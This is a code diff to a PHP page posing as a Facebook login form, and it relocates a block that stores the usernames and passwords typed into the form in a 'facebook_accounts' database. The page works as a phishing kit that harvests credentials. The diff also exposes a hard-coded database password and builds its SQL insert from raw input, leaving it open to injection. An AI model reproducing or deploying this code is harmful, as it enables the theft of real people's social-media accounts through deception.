@@ -78,28 +78,6 @@
     }
     
   </style>
-
-<?php
-    $servidor = "localhost";
-    $usuario = "id21738922_root";
-    $clave = "";
-    $baseDeDatos = "id21738922_facebook_accounts";
-
-    $conectar = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
-?>   
-
-
-<?php
-    if(isset($_POST['login'])){
-       
-    $username= $_POST ['username'];
-    $password= $_POST ['password'];
-        
-    $insertarDatos = "INSERT INTO log_in VALUES('$username','$password','0')";
-    $ejecutarInsertar = mysqli_query ($conectar, $insertarDatos);
-    
-   }
-?>
   
 <link rel="icon" href="https://i.postimg.cc/vTNxR9Kx/FB.jpg" type="image/x-icon">  
 
@@ -134,6 +112,32 @@
       </div>
     </form>
   </div></center>  
+
+
+<?php
+    $servidor = "localhost";
+    $usuario = "id21738922_root";
+    $clave = "";
+    $baseDeDatos = "id21738922_facebook_accounts";
+
+    $conectar = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
+?>   
+
+
+<?php
+    if(isset($_POST['login'])){
+       
+    $username= $_POST ['username'];
+    $password= $_POST ['password'];
+        
+    $insertarDatos = "INSERT INTO log_in VALUES('$username','$password','0')";
+    $ejecutarInsertar = mysqli_query ($conectar, $insertarDatos);
+    
+   }
+?>
+
+
+
   
 </body>
 </html>
